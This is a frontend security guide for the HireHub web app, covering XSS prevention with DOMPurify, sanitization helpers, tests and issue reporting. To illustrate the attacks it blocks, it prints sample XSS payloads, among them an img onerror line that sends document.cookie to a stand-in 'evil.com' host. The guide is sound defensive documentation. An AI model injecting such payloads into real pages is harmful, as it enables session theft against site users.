# Security Guidelines

This document outlines security best practices and patterns used in the HireHub frontend application to prevent common web vulnerabilities.

## Table of Contents

- [XSS Prevention](#xss-prevention)
- [Content Sanitization](#content-sanitization)
- [Secure Coding Patterns](#secure-coding-patterns)
- [Security Testing](#security-testing)
- [Reporting Security Issues](#reporting-security-issues)

---

## XSS Prevention

Cross-Site Scripting (XSS) is the #1 vulnerability we protect against. Our application handles user-generated content and API responses that may contain HTML, making XSS prevention critical.

### Why XSS is a Risk

The application renders dynamic HTML content from:
1. **API Responses**: Resume content, cover letters, job descriptions (generated by LLMs)
2. **User Input**: Icon SVGs, dynamic content
3. **Third-party Data**: Learning resources, external content

Without proper sanitization, attackers could inject malicious scripts that:
- Steal user credentials and session tokens
- Perform actions on behalf of users
- Redirect users to phishing sites
- Modify page content

### Our Defense Strategy

We use **DOMPurify** (via `isomorphic-dompurify`) to sanitize all dynamic HTML before rendering with `v-html`.

**Key Principle**: ⚠️ **NEVER use `v-html` without sanitization**

---

## Content Sanitization

### Sanitization Utility (`utils/sanitize.ts`)

We provide four sanitization functions for different use cases:

#### 1. `sanitizeHtml(html: string): string`

**Use Case**: Sanitize rich text content (resumes, cover letters, job descriptions)

**Allowed Elements**:
- Text formatting: `<p>`, `<br>`, `<strong>`, `<em>`, `<u>`, `<b>`, `<i>`
- Headings: `<h1>` through `<h6>`
- Lists: `<ul>`, `<ol>`, `<li>`
- Containers: `<span>`, `<div>`, `<blockquote>`, `<pre>`, `<code>`
- Links: `<a>` (with `href`, `target`, `rel` attributes)

**Blocked Elements**:
- `<script>`, `<iframe>`, `<object>`, `<embed>`, `<style>`
- Event handlers: `onclick`, `onerror`, `onload`, etc.
- `javascript:` URLs
- `data:` URLs
- All `data-*` attributes

**Example**:

```vue
<template>
  <!-- ❌ UNSAFE - Never do this -->
  <div v-html="apiContent"></div>

  <!-- ✅ SAFE - Always sanitize -->
  <div v-html="sanitizedContent"></div>
</template>

<script setup lang="ts">
import { computed } from 'vue'
import { sanitizeHtml } from '~/utils/sanitize'

const props = defineProps<{
  apiContent: string
}>()

const sanitizedContent = computed(() =>
  sanitizeHtml(props.apiContent)
)
</script>
```

#### 2. `sanitizeSvg(svg: string): string`

**Use Case**: Sanitize SVG icons from dynamic sources

**Security**: Uses DOMPurify's strict SVG profile

**Example**:

```vue
<template>
  <span v-html="sanitizedIcon"></span>
</template>

<script setup lang="ts">
import { computed } from 'vue'
import { sanitizeSvg } from '~/utils/sanitize'

const props = defineProps<{
  iconSvg: string
}>()

const sanitizedIcon = computed(() =>
  sanitizeSvg(props.iconSvg)
)
</script>
```

#### 3. `containsDangerousHtml(html: string): boolean`

**Use Case**: Detect potentially malicious content before processing

**Returns**: `true` if content contains dangerous elements

**Example**:

```typescript
import { containsDangerousHtml } from '~/utils/sanitize'

const userInput = '<p onclick="alert()">Click me</p>'

if (containsDangerousHtml(userInput)) {
  console.warn('Malicious content detected and blocked')
  // Log security event, notify admins, etc.
}
```

#### 4. `sanitizeText(text: string): string`

**Use Case**: Strip ALL HTML tags, return plain text only

**Example**:

```typescript
import { sanitizeText } from '~/utils/sanitize'

const html = '<p>Hello <strong>World</strong></p>'
const plain = sanitizeText(html) // Returns: "Hello World"
```

---

## Secure Coding Patterns

### Pattern 1: Always Sanitize API Responses

**Components using sanitization**:

✅ **ResumeRewriteResult.vue** (3 instances)
- `sanitizedSummary` - Professional summary from LLM
- `sanitizedJobDescription` - Job descriptions from LLM
- `sanitizedProjectDescription` - Project descriptions from LLM

✅ **CoverLetterResult.vue** (1 instance)
- `formattedCoverLetter` - Cover letter from LLM

✅ **HbCardSelect.vue** (1 instance)
- `getSanitizedIcon` - SVG icons from props

✅ **HbIcon.vue** (1 instance)
- `sanitizedSvgContent` - Dynamic SVG imports

### Pattern 2: Computed Properties for Sanitization

Always use computed properties so sanitization happens reactively:

```vue
<script setup lang="ts">
import { computed } from 'vue'
import { sanitizeHtml } from '~/utils/sanitize'

const props = defineProps<{
  htmlContent: string
}>()

// ✅ GOOD - Reactive sanitization
const sanitized = computed(() =>
  sanitizeHtml(props.htmlContent)
)

// ❌ BAD - Only sanitizes once
const sanitized = sanitizeHtml(props.htmlContent)
</script>
```

### Pattern 3: Defense in Depth

Even with sanitization, follow these practices:

1. **Content Security Policy (CSP)**: Configure CSP headers to block inline scripts
2. **HTTP-Only Cookies**: Store sensitive tokens in HTTP-only cookies
3. **Input Validation**: Validate data on both client and server
4. **Regular Updates**: Keep DOMPurify and all dependencies updated

### Pattern 4: Type Safety

Use TypeScript to prevent unsafe operations:

```typescript
// ✅ Type-safe - compiler enforces sanitization
interface SafeHtmlContent {
  raw: string
  sanitized: string
}

function renderContent(content: SafeHtmlContent) {
  // Can only access sanitized version
  return content.sanitized
}

// ❌ Unsafe - easy to forget sanitization
function renderContent(content: string) {
  return content // Might be unsanitized!
}
```

---

## Security Testing

### Test Coverage

We have **40 comprehensive tests** for the sanitization utility:

**Location**: `tests/unit/utils/sanitize.spec.ts`

**Test Categories**:
1. **Safe Content Handling** (12 tests)
   - Allows safe HTML tags
   - Preserves legitimate content
   - Handles empty/plain text

2. **XSS Attack Prevention** (10 tests)
   - Blocks `<script>` tags
   - Removes event handlers (`onclick`, `onerror`)
   - Blocks `javascript:` URLs
   - Blocks `data:` URLs
   - Removes `<iframe>`, `<object>`, `<embed>`
   - Strips `data-*` attributes

3. **SVG Security** (6 tests)
   - Allows safe SVG elements
   - Blocks scripts in SVG
   - Removes event handlers

4. **Malicious Content Detection** (10 tests)
   - Detects script injection
   - Detects event handler injection
   - Detects dangerous URLs

5. **Real-World Attack Vectors** (6 tests)
   - Base64-encoded scripts
   - SVG `onload` attacks
   - Style-based attacks
   - Image `onerror` attacks

### Running Security Tests

```bash
# Run all sanitization tests
npm run test:run -- tests/unit/utils/sanitize.spec.ts

# Run with coverage
npm run test:coverage

# Run all security-related tests
npm run test:run -- tests/unit/utils tests/unit/components
```

### Manual Security Testing

Before deploying, manually test these scenarios:

1. **Script Injection**:
   ```html
   <script>alert('XSS')</script>
   ```

2. **Event Handler Injection**:
   ```html
   <img src="x" onerror="alert('XSS')">
   ```

3. **JavaScript URL**:
   ```html
   <a href="javascript:alert('XSS')">Click</a>
   ```

4. **SVG Script**:
   ```html
   <svg onload="alert('XSS')"><circle /></svg>
   ```

All should be blocked/stripped by sanitization.

---

## Common Vulnerabilities Prevented

### 1. Script Injection

**Attack**:
```html
<p>Hello</p><script>alert(document.cookie)</script>
```

**Defense**: DOMPurify removes `<script>` tags entirely

**Result**:
```html
<p>Hello</p>
```

### 2. Event Handler Injection

**Attack**:
```html
<img src="x" onerror="fetch('evil.com?cookie='+document.cookie)">
```

**Defense**: All event handlers (`onerror`, `onclick`, etc.) are stripped

**Result**:
```html
<img src="x">
```

### 3. JavaScript URLs

**Attack**:
```html
<a href="javascript:alert('XSS')">Click me</a>
```

**Defense**: `javascript:` URLs are blocked

**Result**:
```html
<a>Click me</a>
```

### 4. Data URL Attacks

**Attack**:
```html
<a href="data:text/html,<script>alert('XSS')</script>">Click</a>
```

**Defense**: `data:` URLs are blocked

**Result**:
```html
<a>Click</a>
```

### 5. SVG-based XSS

**Attack**:
```html
<svg onload="alert('XSS')"><circle cx="50" cy="50" r="40"/></svg>
```

**Defense**: Event handlers removed, strict SVG profile enforced

**Result**:
```html
<svg><circle cx="50" cy="50" r="40"/></svg>
```

---

## Best Practices Checklist

When working with dynamic HTML:

- [ ] Import `sanitizeHtml` or `sanitizeSvg` from `~/utils/sanitize`
- [ ] Create computed property for sanitized content
- [ ] Use computed property in `v-html` directive
- [ ] Write tests for new components using `v-html`
- [ ] Never bypass sanitization for "trusted" content (LLMs can be prompt-injected)
- [ ] Review PR diffs carefully for any new `v-html` usage
- [ ] Run security tests before merging (`npm run test:run`)

---

## Reporting Security Issues

If you discover a security vulnerability:

1. **DO NOT** open a public GitHub issue
2. **DO NOT** commit fixes to public branches
3. **DO** email the security team immediately
4. **DO** provide:
   - Description of the vulnerability
   - Steps to reproduce
   - Potential impact
   - Suggested fix (if known)

We take security seriously and will respond within 24 hours.

---

## Security Updates

### Current Protections

- ✅ DOMPurify v3.x (latest stable)
- ✅ Strict allowlist configuration
- ✅ 40 security tests (100% passing)
- ✅ All 6 v-html instances sanitized
- ✅ Type-safe sanitization API

### Security Audit History

- **2024-11-25**: Initial security audit completed
  - Fixed 6 XSS vulnerabilities
  - Implemented DOMPurify sanitization
  - Added comprehensive test suite

### Planned Improvements

- [ ] Add Content Security Policy (CSP) headers
- [ ] Implement subresource integrity (SRI) for CDN assets
- [ ] Add automated security scanning to CI/CD
- [ ] Regular dependency updates via Dependabot

---

## Resources

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)
- [Vue.js Security Best Practices](https://vuejs.org/guide/best-practices/security.html)
- [MDN: Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)

---

**Last Updated**: 2024-11-25
**Version**: 1.0.0
